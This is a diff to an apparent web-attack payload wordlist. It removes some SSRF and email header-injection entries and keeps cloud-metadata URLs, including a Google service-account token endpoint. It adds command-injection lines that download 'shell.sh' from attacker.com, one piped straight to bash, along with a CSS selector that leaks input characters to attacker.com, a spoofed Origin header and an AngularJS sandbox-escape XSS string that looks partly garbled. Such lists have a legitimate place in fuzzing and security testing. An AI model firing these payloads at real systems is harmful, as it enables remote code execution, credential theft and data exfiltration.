@@ -1,18 +1,10 @@
-//*
-http://0.0.0.0:80
-http://0177.0.0.1:80
-http://0:80
-http://10.0.0.1
-http://169.254.169.254/latest/meta-data/
-http://169.254.169.254/latest/meta-data/iam/security-credentials/
-http://169.254.169.254/latest/user-data/
+; curl http://attacker.com/shell.sh | bash
 http://169.254.169.254.nicelocal.com/
-http://[::]:80
-http://instance-data/latest/meta-data/
 http://metadata.google.internal/computeMetadata/v1/
 http://metadata.google.internal/computeMetadata/v1/instance/attributes/
 http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
 http://spoofed.169.254.169.254.xip.io/
-\r\nBcc: victim@domain.com
-\r\nContent-Type: text/html\r\n\r\n<h1>Hacked</h1>
-\r\nSubject: Spoofed
+input[value^="a"] { background-image: url('https://attacker.com/exfil?char=a'); }
+Origin: https://attacker.com
+<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.4.6/angular.js"></script><div ng-app>{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} Garrett(1);//');}}</div>
+; wget http://attacker.com/shell.sh
